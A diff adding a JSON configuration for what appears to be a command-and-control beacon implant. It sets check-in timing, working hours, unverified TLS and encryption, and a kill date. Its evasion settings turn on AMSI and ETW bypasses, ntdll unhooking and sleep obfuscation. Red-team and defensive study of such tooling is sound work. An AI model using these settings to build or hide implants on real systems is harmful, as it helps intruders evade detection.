@@ -1,0 +1,38 @@
+{
+  "mode": "beacon",
+  "transport": "tcp_tls",
+  "connection": {
+    "sleep": 60,
+    "jitter": 0.5,
+    "working_hours": {
+      "start": "08:00",
+      "end": "18:00"
+    },
+    "reconnect_delay": 300
+  },
+  "tls": {
+    "enabled": true,
+    "min_version": "TLSv1_2",
+    "verify": false
+  },
+  "encryption": {
+    "enabled": true,
+    "method": "ECDH_AES_256_GCM"
+  },
+  "evasion": {
+    "auto_bypass": true,
+    "amsi_bypass": true,
+    "etw_bypass": true,
+    "unhook_ntdll": true,
+    "sleep_obfuscation": true,
+    "kill_date": "+90"
+  },
+  "http_profile": "stealth",
+  "persistence": {
+    "auto_install": false
+  },
+  "logging": {
+    "level": "warn",
+    "console": false
+  }
+}
